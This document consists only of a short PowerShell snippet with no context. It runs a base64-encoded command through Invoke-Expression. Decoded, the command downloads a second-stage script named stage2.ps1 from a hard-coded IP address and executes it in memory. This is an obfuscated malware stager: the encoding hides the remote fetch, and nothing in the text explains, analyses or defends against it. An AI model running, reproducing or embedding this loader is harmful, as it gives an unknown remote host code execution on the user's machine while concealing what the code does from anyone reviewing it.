$encoded = "SW52b2tlLUV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTMuNDIuMTEuMjMvc3RhZ2UyLnBzMScp"
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded)))
